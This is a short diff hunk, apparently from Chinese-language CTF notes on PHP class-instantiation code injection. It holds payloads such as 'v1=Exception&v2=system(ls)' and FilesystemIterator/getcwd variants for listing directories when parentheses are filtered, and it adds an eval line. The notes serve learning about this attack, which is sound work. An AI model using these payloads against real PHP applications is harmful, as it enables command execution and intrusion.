@@ -22,6 +22,6 @@ v1=Exception&v2=system(ls)
 ```
 如果有过滤不能使用()，使用getcwd()方法，无需传参。
 ```
-v1=Directorylnterator&v2=phpinfo
 v1=FilesystemIterator&v2=getcwd
+eval("echo new FilesystemIterator(getcwd());");
 ```
